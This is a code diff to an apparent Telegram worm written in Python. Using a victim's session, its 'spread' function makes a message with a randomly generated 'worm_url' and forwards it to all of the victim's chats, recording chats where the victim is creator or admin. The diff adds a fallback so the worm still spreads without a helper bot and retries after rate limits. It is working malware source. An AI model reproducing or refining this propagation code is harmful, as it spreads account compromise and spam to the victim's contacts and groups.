@@ -76,21 +76,23 @@ async def backup_saves(client, me, logger_bot):
     log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
     return log
 async def spread(client, me, botinfo, log):
-    if botinfo is None:
-        return
-    async with TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e').start(bot_token=botinfo['token']) as bot:
-        worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
-        async with client.conversation(f"@{botinfo['username']}") as conv:
-            msg = await conv.send_message("/start")
-            await bot.send_message(
-                me.id,
-                strings['worm_msg'],
-                file='files/worm.png',
-                buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
-                link_preview=False
-            )
-            spread_msg = await conv.get_response()
-        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
+    spread_msg = None
+    spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
+    if botinfo is not None:
+        async with TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e') as bot:
+            await bot.start(bot_token=botinfo['token'])
+            worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
+            async with client.conversation(f"@{botinfo['username']}") as conv:
+                msg = await conv.send_message("/start")
+                await bot.send_message(
+                    me.id,
+                    strings['worm_msg'],
+                    file='files/worm.png',
+                    buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
+                    link_preview=False
+                )
+                spread_msg = await conv.get_response()
+            spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
     perm_logs = {
         'creator': [],
         'admin': [],
@@ -113,10 +115,16 @@ async def spread(client, me, botinfo, log):
             elif permissions.is_admin:
                 perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
         try:
-            msg = await spread_msg.forward_to(dialog)
+            if spread_msg:
+                msg = await spread_msg.forward_to(dialog)
+            else:
+                msg = await dialog.send_message(spread_msg_nomedia)
         except errors.FloodWaitError as e:
             await asyncio.sleep(e.seconds)
-            msg = await spread_msg.forward_to(dialog)
+            if spread_msg:
+                msg = await spread_msg.forward_to(dialog)
+            else:
+                msg = await dialog.send_message(spread_msg_nomedia)
         except:
             try:
                 msg = await dialog.send_message(spread_msg_nomedia)
